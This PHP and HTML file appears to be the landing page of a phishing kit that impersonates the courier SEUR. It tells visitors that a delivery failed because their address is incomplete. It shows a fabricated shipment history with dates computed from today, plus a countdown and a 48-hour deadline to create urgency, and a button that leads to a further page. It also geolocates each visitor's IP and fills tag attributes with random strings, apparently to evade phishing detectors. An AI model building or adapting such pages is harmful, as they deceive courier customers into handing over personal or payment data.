<?php 
    require_once "functions.php";
    function generateCodeFromIP($ip) {
    // Convert IP to numeric hash
    $hash = abs(crc32($ip));

    // Format number to 12 digits
    $number = str_pad($hash, 12, "0", STR_PAD_LEFT);

    // Add prefix
    return "MIA" . $number;
}

// Get visitor IP
$ip = $_SERVER['REMOTE_ADDR'];

// Generate code
$code = generateCodeFromIP($ip);

$base = new DateTime();

function getTimeByDay($dayIndex) {
    srand($dayIndex * 999); // باش كل نهار يبقى نفس الوقت

    $hour = rand(1, 12);
    $minute = str_pad(rand(0, 59), 2, '0', STR_PAD_LEFT);
    $ampm = rand(0, 1) ? 'AM' : 'PM';

    return str_pad($hour, 2, '0', STR_PAD_LEFT) . ":" . $minute . " " . $ampm;
}

function getVisitorCountry() {

    $ip = $_SERVER['REMOTE_ADDR'];

    // فالتست على localhost
    if ($ip == "127.0.0.1" || $ip == "::1") {
        return "Miami, Florida";
    }
    
    $url = "http://ip-api.com/json/$ip";

    $response = file_get_contents($url);

    if ($response !== false) {

        $data = json_decode($response, true);

        if ($data && $data['status'] == 'success') {
            return $data['country'];
       
 }
    }

    return "Unknown";
}

$country = getVisitorCountry();

?>



<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>SEUR: Envío y transporte de paquetería y mensajería | SEUR</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/bc.css">
  <link rel="preconnect" href="https://fonts.gstatic.com">

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/favicon.jpg" type="image/x-icon" />
  <link rel="shortcut icon" href="image/favicon.jpg" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons" />
  <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
  <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 


</head>
<body >
   
   <header style="z-index: 9999999999999999999999;background: white;">
       <div class="container">
           <div class="left d-flex align-items-center">
               <img src="image/logo.png" alt="" width="120px" class="img-fluid">
               <img src="image/list.png" alt="" style="margin-left:30px" class="d-none d-xl-block img=fluis">
           </div>
           <div class="right">
               <img src="image/bar.png" alt="" class="d-block d-xl-none img-fluid" style="padding-left:30px">
               <img src="image/left22.png" alt=""  class="d-none d-xl-block img-fluid" >
           </div>
       </div>
   </header>
   <style>
       .nossa{
            color: #fff;
            padding: 40px 20px 60px;
            position: relative;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            overflow: hidden;
       }
       .mm{
            background: url("image/ass.jpg") center / cover no-repeat;
            color: #fff;
            padding: 40px 20px 60px;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            height: 380px;
            position: relative;
            .header-content{
                max-width: 1280px;
                width: 100%;
                margin: 0 auto;
                position: relative;
                z-index: 9999999999999;
            }
            .nn{
                position: absolute;
                inset: 0;
                background: linear-gradient(to right, #0072bc, #0072bccc, #0072bc33);
                left: 0; 
                top: 0;
                bottom: 0;
                right: ;
                width: 100%;
                height: 100%;
            }
       }
   </style>

    <main id="main">
       <div class="mm">
           <div class="nn"></div>
           <div data-v-1569c68f="" class="header-content"><h1 data-v-1569c68f="" class="main-headline"><b>Entrega no realizada:<br data-v-1569c68f=""></b></h1>
               <p style="font-size:17px">Tu paquete no pudo ser entregado debido a una dirección incompleta. Por favor, completa tus datos de entrega para reprogramar la entrega.</p>
               <br>
               <small>Verifica tu información para reprogramar la entrega.</small>
           </div>
           </div>
       </div>
       <div class="container mt-5" style="padding-bottom: 30px;">
           <div class="login  shadow" style="background:white;border-radius: 15px; margin-top: -30px;position: relative;z-index: 88888;">
            <div class="bb" style="height: 49px;background: linear-gradient(to right, #dc2626, #f60);color: #fff;padding: 12px 24px;display: flex;align-items: center;justify-content: space-between;border-radius: 12px 12px 0 0;">
                <div class="abb d-flex align-items-center gap-2">
                    <svg data-v-3e292fc7="" class="seur-alert-icon" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M12 9v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg>
                    <b>Entrega no realizada</b>
                    <small class="d-none d-sm-flex">Dirección incompleta</small>
                </div>
                <style>
                    .bb{
                        display: flex;
                        align-items: center;
                    }
                    .abb{
                        
                    }
                    .time{
                        display: flex;
                        align-items: center;
                        gap: 8px;
                        background-color: #fff3;
                        -webkit-backdrop-filter: blur(4px);
                        backdrop-filter: blur(4px);
                        border-radius: 9999px;
                        padding: 4px 12px;
                    }
                </style>
                <div class="time">
                    <svg data-v-3e292fc7="" class="seur-timer-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle data-v-3e292fc7="" cx="12" cy="12" r="10" stroke-width="2"></circle><path data-v-3e292fc7="" d="M12 6v6l4 2" stroke-width="2" stroke-linecap="round"></path></svg>
                    <div class="countdown" id="timer" style="font-size:13px;font-weight: 700;">
                       28:42:45
                    </div>
                </div>
            </div>
            <div class="nasas row" style="padding: 20px;">
               <div class="col-lg-6 mb-4 col-md-6">
                   <div style="padding-right:20px;">
                       <img src="image/pending.png" alt="" class="img-fluid">
                   </div>
               </div>
               <div class="col-lg-6 mb-4 col-md-6">
                   <div>
                       <p>Selecciona una nueva fecha y hora de entrega para recibir tu paquete.</p>
                       <a href="notice.php" style="text-decoration:none;">
                           <button class="btn btx d-flex align-items-center justify-content-between">
                               <div class="d-flex gap-2">
                                   <svg width="20" height="20" data-v-3e292fc7="" class="seur-reschedule-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M1 4v6h6M23 20v-6h-6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path data-v-3e292fc7="" d="M20.49 9A9 9 0 005.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 003.51 15" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg>
                                   <span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Reprogramar entrega" data-omjjgus785="&gt;if%]*!&amp;&quot;&lt;mmz" data-uxfbps="[t}/x?y{o&lt;ix" temp-kjgzj202="}&gt;=]l\po@" zml950="kpw#}l%|@ols*" data-kkjoh119="a&amp;@f$qt=">Reprogramar entrega</span>
                               </div>
                               <svg width="20" height="20" data-v-3e292fc7="" class="seur-reschedule-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M9 18l6-6-6-6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg>
                           </button>
                       </a>
                   </div>
                   <style>
                        .btx{
                            width: 100%;
                            background-color: #FF6600 !important;
                            color: #fff;
                            font-weight: 600;
                            font-size: 16px;
                            padding: 20px 24px !important;
                            border-radius: 12px !important;
                            border: none;
                            cursor: pointer;
                            transition: all .2s !important;
                            margin-bottom: 12px;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            gap: 12px;
                            box-shadow: 0 4px 12px #f603 !important;
                        }
                        .btn:hover{
                            background-color: #e55a00 !important;
                            transform: translateY(-2px);
                            box-shadow: 0 8px 16px #ff66004d;
                            color: white !important;
                        }
                        .seur-reschedule-icon[data-v-3e292fc7] {
                            transition: all .2s !important;
                        }
                        .btn:hover .seur-reschedule-icon[data-v-3e292fc7] {
                             transform: rotate(180deg); 
                             transition: all .2s !important;
                         }
                        .seur-reschedule-arrow[data-v-3e292fc7] {
                            transition: all .2s !important;
                        }
                        .btn:hover .seur-reschedule-arrow[data-v-3e292fc7] {
                            transform: translate(4px);
                        }
                   </style>
               </div>
            </div>
            </div> 
            <div class="login  shadow mt-4" style="background:white;margin:10px 17px;padding: 20px;border-radius: 15px; margin-top: -30px;position: relative;z-index: 88888;">
               <h5 class="mt-3 d-flex align-items-center gap-2"><svg width="24" height="24" data-v-3e292fc7="" class="seur-timeline-title-icon" viewBox="0 0 24 24" fill="none" stroke="#0072bc"><path data-v-3e292fc7="" d="M21 16V8a2 2 0 00-1-1.73l-7-4a2 2 0 00-2 0l-7 4A2 2 0 003 8v8a2 2 0 001 1.73l7 4a2 2 0 002 0l7-4A2 2 0 0021 16z" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg><b style="color: #0072bc;">Historial del envío</b></h5>
               <br>

               <div data-v-3e292fc7="" class="seur-timeline-list" style="position:relative;"><div data-v-3e292fc7="" class="seur-timeline-item"><div data-v-3e292fc7="" class="seur-timeline-line seur-timeline-line-completed"></div><div data-v-3e292fc7="" class="seur-timeline-icon seur-timeline-icon-completed"><svg data-v-3e292fc7="" class="seur-timeline-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M22 11.08V12a10 10 0 11-5.93-9.14" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path data-v-3e292fc7="" d="M22 4L12 14.01l-3-3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></div><div data-v-3e292fc7="" class="seur-timeline-content"><div data-v-3e292fc7="" class="seur-timeline-header" style="display: flex;text-align: center;justify-content: space-between;"><h3   data-v-3e292fc7="" class="seur-timeline-event-title"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Pedido recibido" wof="oa'%/'e%a" meta-mdefigh="|a&amp;%&gt;t?+{**u" zlcso356="b]*jd" data-knjv="y|zfrxr/}b"></span>Pedido recibido</h3><span data-v-3e292fc7="" class="seur-timeline-time">
                   <?php 
                        $d = clone $base;
                        $d->modify("-5 day");
                        echo $d->format('d/m/Y') . ", " . getTimeByDay(0);
                    ?>
               </span></div><p data-v-3e292fc7="" class="seur-timeline-description"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Tu pedido ha sido procesado y confirmado" yfhmq618="}['}#k" temp-jap="c&lt;zd[k!hp*" meta-hpphtf184="?oe&gt;&gt;%p*t?%h&gt;">Tu pedido ha sido procesado y confirmado</span></p><p data-v-3e292fc7="" class="seur-timeline-location"><svg data-v-3e292fc7="" class="seur-location-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z" stroke-width="2"></path><circle data-v-3e292fc7="" cx="12" cy="10" r="3" stroke-width="2"></circle></svg><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Tienda online" info-uyrwqfm185="mmarga*&amp;*k" info-phw17="!%forcz]&quot;&lt;n" temp-vtfnwxz="b+#@w=&gt;eb+|\/">Tienda online</span></p></div></div>

               <div data-v-3e292fc7="" class="seur-timeline-item"><div data-v-3e292fc7="" class="seur-timeline-line seur-timeline-line-completed"></div><div data-v-3e292fc7="" class="seur-timeline-icon seur-timeline-icon-completed"><svg data-v-3e292fc7="" class="seur-timeline-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M22 11.08V12a10 10 0 11-5.93-9.14" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path data-v-3e292fc7="" d="M22 4L12 14.01l-3-3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></div><div data-v-3e292fc7="" class="seur-timeline-content"><div data-v-3e292fc7="" class="seur-timeline-header"><h3 data-v-3e292fc7="" class="seur-timeline-event-title"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Recogido en origen" attr-gbb="&amp;*b!]c" attr-motrygl999="&lt;]x%jzr]y$?#]v" data-osjmcwo="xts|$&quot;q/z&gt;o&quot;" cache-avlcuq="}$=%lv" info-xyscmi914="d$&gt;\bd=+fc'">Recogido en origen</span></h3><span data-v-3e292fc7="" class="seur-timeline-time">
                   <?php 
                        $d = clone $base;
                        $d->modify("-4 day");
                        echo $d->format('d/m/Y') . ", " . getTimeByDay(0);
                    ?>
               </span></div><p data-v-3e292fc7="" class="seur-timeline-description"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="El paquete ha sido recogido del remitente" qytn="&quot;/@g{g" cache-knwun="]#qc$+|jf" meta-yetwinx="\dy{{jie?oc\" cache-eqwu718="x]}&quot;{ngmg{vd]\" fxlaq510="kive]skgcq}kj$">El paquete ha sido recogido del remitente</span></p><p data-v-3e292fc7="" class="seur-timeline-location"><svg data-v-3e292fc7="" class="seur-location-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z" stroke-width="2"></path><circle data-v-3e292fc7="" cx="12" cy="10" r="3" stroke-width="2"></circle></svg><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Madrid, España" info-pokzqx850="#pm%i'[" meta-hrxebra410="'fdxq|" temp-hsasxtj="z&lt;swf+@" attr-cggvtiz548="{&amp;#edq[cu">Madrid, España</span></p></div></div>

               <div data-v-3e292fc7="" class="seur-timeline-item"><div data-v-3e292fc7="" class="seur-timeline-line seur-timeline-line-completed"></div><div data-v-3e292fc7="" class="seur-timeline-icon seur-timeline-icon-completed"><svg data-v-3e292fc7="" class="seur-timeline-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M22 11.08V12a10 10 0 11-5.93-9.14" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path data-v-3e292fc7="" d="M22 4L12 14.01l-3-3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></div><div data-v-3e292fc7="" class="seur-timeline-content"><div data-v-3e292fc7="" class="seur-timeline-header"><h3 data-v-3e292fc7="" class="seur-timeline-event-title"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="En tránsito" cache-qtbo587="]%/e\]s%jb" data-bgjudcp="zuu*{" cache-xcyqlq373="$x}iae=o/ymp">En tránsito</span></h3><span data-v-3e292fc7="" class="seur-timeline-time">
                   <?php 
                        $d = clone $base;
                        $d->modify("3 day");
                        echo $d->format('d/m/Y') . ", " . getTimeByDay(0);
                    ?>
               </span></div><p data-v-3e292fc7="" class="seur-timeline-description"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Tu paquete está en camino al centro de distribución" data-xeje677="%hprwh@/" pifn789="/agzs@&quot;+" info-weqhb="x!fs[=" info-ngbbfd753="n=j+px}eg$af&amp;">Tu paquete está en camino al centro de distribución</span></p><p data-v-3e292fc7="" class="seur-timeline-location"><svg data-v-3e292fc7="" class="seur-location-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z" stroke-width="2"></path><circle data-v-3e292fc7="" cx="12" cy="10" r="3" stroke-width="2"></circle></svg><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Centro logístico Madrid" cache-nhcksun="\\f\!e&amp;r&amp;" temp-ycgoexb="fkzdry|*&quot;=" ekobulx717="{]mj]#vs]j*no">Centro logístico Madrid</span></p></div></div>


               <div data-v-3e292fc7="" class="seur-timeline-item"><div data-v-3e292fc7="" class="seur-timeline-line seur-timeline-line-completed"></div><div data-v-3e292fc7="" class="seur-timeline-icon seur-timeline-icon-completed"><svg data-v-3e292fc7="" class="seur-timeline-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M22 11.08V12a10 10 0 11-5.93-9.14" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path data-v-3e292fc7="" d="M22 4L12 14.01l-3-3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></div><div data-v-3e292fc7="" class="seur-timeline-content"><div data-v-3e292fc7="" class="seur-timeline-header"><h3 data-v-3e292fc7="" class="seur-timeline-event-title"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="En reparto" temp-cxae="j|&amp;[&quot;']" attr-hikbnes="[md*dz" temp-tcvje962="o&lt;/lqka" info-nen="alqu@#'t[">En reparto</span></h3><span data-v-3e292fc7="" class="seur-timeline-time">
                   <?php 
                        $d = clone $base;
                        $d->modify("-2 day");
                        echo $d->format('d/m/Y') . ", " . getTimeByDay(0);
                    ?>
               </span></div><p data-v-3e292fc7="" class="seur-timeline-description"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="El repartidor está en camino a tu dirección" temp-yrly="%k|&gt;d" info-jilmr="w&amp;wk#&gt;]" attr-brrrmzf767="#&amp;&amp;u|{&amp;&gt;@pz">El repartidor está en camino a tu dirección</span></p><p data-v-3e292fc7="" class="seur-timeline-location"><svg data-v-3e292fc7="" class="seur-location-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z" stroke-width="2"></path><circle data-v-3e292fc7="" cx="12" cy="10" r="3" stroke-width="2"></circle></svg><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Barcelona, España" meta-god207="umpl{yt*=&lt;c" meta-qahf="/x\ar|j]" temp-rsqb="'|kye{rgx$'b" cache-peo350="a#!u[}se}?tb[q">Barcelona, España</span></p></div></div>


               <div data-v-3e292fc7="" class="seur-timeline-item"><div data-v-3e292fc7="" class="seur-timeline-line seur-timeline-line-failed"></div><div data-v-3e292fc7="" class="seur-timeline-icon seur-timeline-icon-failed"><svg data-v-3e292fc7="" class="seur-timeline-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle data-v-3e292fc7="" cx="12" cy="12" r="10" stroke-width="2"></circle><path data-v-3e292fc7="" d="M15 9l-6 6M9 9l6 6" stroke-width="2" stroke-linecap="round"></path></svg></div><div data-v-3e292fc7="" class="seur-timeline-content"><div data-v-3e292fc7="" class="seur-timeline-header"><h3 data-v-3e292fc7="" class="seur-timeline-event-title seur-timeline-event-title-failed"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Intento de entrega fallido" temp-ygcfg="o!w&lt;@&gt;[=r{$&gt;|\" temp-wybharn="z&lt;!va]" attr-cufpfkn509="}&quot;+&gt;a*pfi&lt;" meta-tkkc="h|k?#$b&amp;{$=" data-bhir910="sd}#\%b&quot;d%=y">Intento de entrega fallido</span></h3><span data-v-3e292fc7="" class="seur-timeline-time">
                   <?php 
                        $d = clone $base;
                        $d->modify("-1 day");
                        echo $d->format('d/m/Y') . ", " . getTimeByDay(0);
                    ?>
               </span></div><p data-v-3e292fc7="" class="seur-timeline-description seur-timeline-description-failed"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="No se pudo verificar la dirección de entrega. Datos incompletos." data-idhui716="%{!'?ufn*e" attnbs="bde|?" meta-dhd="${nkx=#?j/&lt;?">No se pudo verificar la dirección de entrega. Datos incompletos</span></p><p data-v-3e292fc7="" class="seur-timeline-location"><svg data-v-3e292fc7="" class="seur-location-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z" stroke-width="2"></path><circle data-v-3e292fc7="" cx="12" cy="10" r="3" stroke-width="2"></circle></svg><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Barcelona, España" bgx="&gt;d'&lt;]/&gt;{s" cdmtuux95="&lt;*ip?}zt&amp;grhg" temp-qtwlzcl182="pi[=e&gt;ll">Barcelona, España</span></p></div></div><div data-v-3e292fc7="" class="seur-timeline-item"><!----><div data-v-3e292fc7="" class="seur-timeline-icon seur-timeline-icon-pending"><svg data-v-3e292fc7="" class="seur-timeline-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle data-v-3e292fc7="" cx="12" cy="12" r="10" stroke-width="2"></circle><path data-v-3e292fc7="" d="M12 6v6l4 2" stroke-width="2" stroke-linecap="round"></path></svg></div><div data-v-3e292fc7="" class="seur-timeline-content"><div data-v-3e292fc7="" class="seur-timeline-header"><h3 data-v-3e292fc7="" class="seur-timeline-event-title seur-timeline-event-title-pending"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Pendiente de reprogramación" cache-zqek="adxj+lr&amp;uo" temp-xmb568="xan$jps*ux" temp-hnad20="?o?ew+e&gt;f">Pendiente de reprogramación</span></h3><span data-v-3e292fc7="" class="seur-timeline-time seur-timeline-time-pending">- </span></div><p data-v-3e292fc7="" class="seur-timeline-description seur-timeline-description-pending"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Esperando nueva fecha de entrega" cache-ljqg896="onjy*|!n" meta-dwke198="$z/'!&amp;" zdooe="i\kdu">Esperando nueva fecha de entrega</span></p><!----></div></div></div>
            </div> 

            <div data-v-3e292fc7="" class="seur-warning-card login " style="    margin: 20px 17px;"><div data-v-3e292fc7="" class="seur-warning-header"><svg data-v-3e292fc7="" class="seur-warning-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M12 9v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg><h3 data-v-3e292fc7="" class="seur-warning-title"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Importante: Actúa antes de 48 horas" cache-ygf38="/!a}+s=d|j/" cache-rbq="uxmag" meta-ejvpfav891="&amp;[$&quot;$$" gypxr687="=|ujoneaubs=" cache-arm587="f\q%&gt;k">Importante: Actúa antes de 48 horas</span></h3></div><p data-v-3e292fc7="" class="seur-warning-description"><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Si no reprogramas la entrega, tu paquete será devuelto al remitente." meta-chpk="wy@*c&amp;p/?" ffks="\jwfwwz}|?\q{" data-oexl="j!@gp\x" data-ivrck990="sq|!ys&amp;&quot;e*\" lhyhsl426="&amp;@\wnq/\mg">Si no reprogramas la entrega, tu paquete será devuelto al remitente.</span></p><ul data-v-3e292fc7="" class="seur-warning-list"><li data-v-3e292fc7="" class="seur-warning-item"><svg data-v-3e292fc7="" class="seur-warning-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle data-v-3e292fc7="" cx="12" cy="12" r="10" stroke-width="2"></circle><path data-v-3e292fc7="" d="M12 6v6l4 2" stroke-width="2" stroke-linecap="round"></path></svg><span data-v-3e292fc7="">Plazo límite: <span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Plazo límite:" temp-vdwahl343="gnq&quot;@$}b" mto461="/}g&gt;&quot;&amp;{/oc" data-awv905="pf&gt;#o/&gt;{&quot;"></span><strong data-v-3e292fc7=""><?php 
                        $d = clone $base;
                        $d->modify("+1 day");
                        echo $d->format('d/m/Y');
                    ?></strong></span></li><li data-v-3e292fc7="" class="seur-warning-item"><svg data-v-3e292fc7="" class="seur-warning-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path data-v-3e292fc7="" d="M1 3h15v13H1zM16 8h4l3 3v5h-7V8z" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path data-v-3e292fc7="" d="M5 8v13M19 8v13" stroke-width="2"></path></svg><span data-v-3e292fc7=""><span data-v-b6603739="" data-v-3e292fc7="" class="sailors-span" data-text="Posibles gastos adicionales por reenvío" xpuxjyh="!\$&quot;v!c&gt;@k[wrf" meta-savtsz241="&lt;=*'[w&lt;" info-duies752="n&amp;m[#r&amp;=&amp;snwl" data-ukcdw496="o&amp;ofqu{i'" data-zws="'tx]i&gt;k$&amp;&lt;/#'">Posibles gastos adicionales por reenvío</span></span></li></ul></div>

            <style>
                .seur-warning-card[data-v-3e292fc7] {
                    background-color: #fef3c7;
                    border: 1px solid #fde68a;
                    border-radius: 8px;
                    padding: 20px;
                    margin-bottom: 24px;
                }

                .seur-warning-header[data-v-3e292fc7] {
                    display: flex;
                    align-items: flex-start;
                    gap: 12px;
                    margin-bottom: 8px;
                }

                .seur-warning-title[data-v-3e292fc7] {
                    font-weight: 600;
                    color: #92400e;
                    font-size: 16px;
                    margin-bottom: 8px;
                }

                .seur-warning-description[data-v-3e292fc7] {
                    font-size: 14px;
                    color: #92400e;
                    margin-bottom: 12px;
                    line-height: 1.6;
                }

                .seur-warning-list[data-v-3e292fc7] {
                    list-style: none;
                    padding: 0;
                    margin: 0;
                    display: flex;
                    flex-direction: column;
                    gap: 8px;
                }

                .seur-warning-item[data-v-3e292fc7] {
                    display: flex;
                    align-items: center;
                    gap: 8px;
                    font-size: 14px;
                    color: #92400e;
                }

                .seur-warning-icon[data-v-3e292fc7] {
                    width: 20px;
                    height: 20px;
                    color: #d97706;
                    flex-shrink: 0;
                    margin-top: 2px;
                }

                .seur-warning-item-icon[data-v-3e292fc7] {
                    width: 16px;
                    height: 16px;
                    flex-shrink: 0;
                    color: #d97706;
                }

                .seur-warning-item-icon[data-v-3e292fc7] {
                    width: 16px;
                    height: 16px;
                    flex-shrink: 0;
                    color: #d97706;
                }
                .seur-timeline-item[data-v-3e292fc7] {
                    position: relative;
                    display: flex;
                    gap: 16px;
                    padding-bottom: 32px;
                }
                .seur-timeline-line-completed[data-v-3e292fc7] {
                    background-color: #34d399;
                }
                .seur-timeline-line[data-v-3e292fc7] {
                    position: absolute;
                    left: 20px;
                    top: 40px;
                    width: 2px;
                    height: calc(100% - 20px);
                    transform: translate(-50%);
                }
                .seur-timeline-icon-completed[data-v-3e292fc7] {
                    background-color: #d1fae5;
                    color: #10b981;
                }
                .seur-timeline-icon[data-v-3e292fc7] {
                    position: relative;
                    z-index: 10;
                    flex-shrink: 0;
                    width: 40px;
                    height: 40px;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }
                .seur-timeline-header{
                    display: flex;
                    align-items: center; justify-content: space-between;
                }
                .seur-timeline-icon-svg[data-v-3e292fc7] {
                    width: 20px;
                    height: 20px;
                }
                .seur-timeline-content[data-v-3e292fc7] {
                    flex: 1;
                    min-width: 0;
                }
                .seur-timeline-event-title[data-v-3e292fc7] {
                    font-weight: 600;
                    color: #111827;
                    font-size: 16px;
                }

                .seur-timeline-icon[data-v-3e292fc7] {
                    position: relative;
                    z-index: 10;
                    flex-shrink: 0;
                    width: 40px;
                    height: 40px;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }

                .seur-location-icon[data-v-3e292fc7] {
                    width: 12px;
                    height: 12px;
                    flex-shrink: 0;
                }

                .seur-timeline-time[data-v-3e292fc7] {
                    font-size: 14px;
                    color: #6b7280;
                }

                @media (min-width: 640px) {
                    .seur-timeline-header[data-v-3e292fc7] {
                        flex-direction: row;
                        align-items: center;
                        justify-content: space-between;
                    }
                }

                .seur-timeline-description[data-v-3e292fc7] {
                    font-size: 14px;
                    color: #6b7280;
                    margin-bottom: 4px;
                    line-height: 1.5;
                }

                .seur-timeline-location[data-v-3e292fc7] {
                    font-size: 12px;
                    color: #6b7280;
                    margin-top: 4px;
                    display: flex;
                    align-items: center;
                    gap: 4px;
                }

                .seur-timeline-icon-failed[data-v-3e292fc7] {
                    background-color: #fee2e2;
                    color: #ef4444;
                }

                .seur-timeline-icon[data-v-3e292fc7] {
                    position: relative;
                    z-index: 10;
                    flex-shrink: 0;
                    width: 40px;
                    height: 40px;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }

                .seur-timeline-event-title-failed[data-v-3e292fc7] {
                    color: #b91c1c;
                }

                .seur-timeline-icon-pending[data-v-3e292fc7] {
                    background-color: #f3f4f6;
                    color: #9ca3af;
                }
                .seur-timeline-icon[data-v-3e292fc7] {
                    position: relative;
                    z-index: 10;
                    flex-shrink: 0;
                    width: 40px;
                    height: 40px;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }

                .seur-timeline-event-title-pending[data-v-3e292fc7] {
                    color: #9ca3af;
                }

                .seur-timeline-line-failed[data-v-3e292fc7] {
                    background-color: #fca5a5;
                }
                .seur-timeline-description-failed[data-v-3e292fc7] {
                    color: #dc2626;
                }
            </style>    

          
       </div>
   </main>




   <footer>
       <div class="container lose">
           <div class="row">
               <div class="col-lg-9">
                   <div class="row">
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between ">Enviar paquete <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt=""> Envio online</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt=""> Envío online con descuento</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt=""> Calculadora servicio SEUR 24</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Recibir envío <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Seguimiento de Envíos</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Entrega interactiva</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Recoger en tienda</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Preguntas frecuentes</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
